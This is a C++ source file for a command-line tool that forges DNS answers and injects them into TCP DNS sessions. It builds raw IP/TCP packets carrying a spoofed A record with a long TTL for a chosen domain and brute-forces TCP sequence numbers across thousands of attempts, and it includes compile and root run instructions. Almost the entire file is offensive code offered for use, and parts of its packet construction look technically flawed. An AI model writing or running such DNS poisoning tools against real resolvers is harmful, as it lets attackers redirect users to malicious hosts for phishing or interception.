// Compile: g++ -o tcp_dns_poison tcp_dns_poison.cpp -lpthread
// Run: sudo ./tcp_dns_poison <target_dns> <domain> <spoof_ip>
// Requires: root privileges (for TCP hijacking)

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>

class TCPDNSInjection {
private:
    std::string targetDNS, domain, spoofIP;
    std::atomic<uint32_t> seqCounter{0};
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    TCPDNSInjection(const std::string& dns, const std::string& d,
                    const std::string& spoof)
        : targetDNS(dns), domain(d), spoofIP(spoof) {}
    
    // Inject DNS response into existing TCP DNS session
    // TCP DNS is used for responses > 512 bytes and zone transfers
    void injectTCPResponse(uint16_t srcPort, uint16_t dstPort,
                          uint32_t seq, uint32_t ack) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
        
        // Build DNS response
        *(uint16_t*)(dns + 0) = htons(rand() & 0xFFFF);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);
        
        int dnsPos = 12;
        dnsPos += encodeName(dns + dnsPos, domain);
        *(uint16_t*)(dns + dnsPos) = htons(1); dnsPos += 2;
        *(uint16_t*)(dns + dnsPos) = htons(1); dnsPos += 2;
        
        *(uint16_t*)(dns + dnsPos) = htons(0xC00C); dnsPos += 2;
        *(uint16_t*)(dns + dnsPos) = htons(1); dnsPos += 2;
        *(uint16_t*)(dns + dnsPos) = htons(1); dnsPos += 2;
        *(uint32_t*)(dns + dnsPos) = htonl(604800); dnsPos += 4;
        *(uint16_t*)(dns + dnsPos) = htons(4); dnsPos += 2;
        struct in_addr addr;
        inet_aton(spoofIP.c_str(), &addr);
        memcpy(dns + dnsPos, &addr.s_addr, 4); dnsPos += 4;
        
        // TCP DNS message has 2-byte length prefix
        char tcpPayload[1024];
        *(uint16_t*)tcpPayload = htons(dnsPos);
        memcpy(tcpPayload + 2, dns, dnsPos);
        int payloadLen = dnsPos + 2;
        
        // TCP header
        tcp->source = htons(srcPort);
        tcp->dest = htons(dstPort);
        tcp->seq = htonl(seq);
        tcp->ack_seq = htonl(ack);
        tcp->doff = 5;
        tcp->psh = 1;
        tcp->ack = 1;
        tcp->window = htons(65535);
        
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), 
               tcpPayload, payloadLen);
        
        // IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payloadLen;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] TCP DNS response injection\n";
        
        // Guess sequence numbers - TCP DNS is connection-oriented
        // but many implementations use weak ISN
        for (int i = 0; i < attempts; i++) {
            uint16_t srcPort = 53;
            uint16_t dstPort = 1024 + (rand() % 64000);
            uint32_t seq = rand();
            uint32_t ack = rand();
            injectTCPResponse(srcPort, dstPort, seq, ack);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <dns> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    TCPDNSInjection injection(argv[1], argv[2], argv[3]);
    injection.run(50000);
    return 0;
}
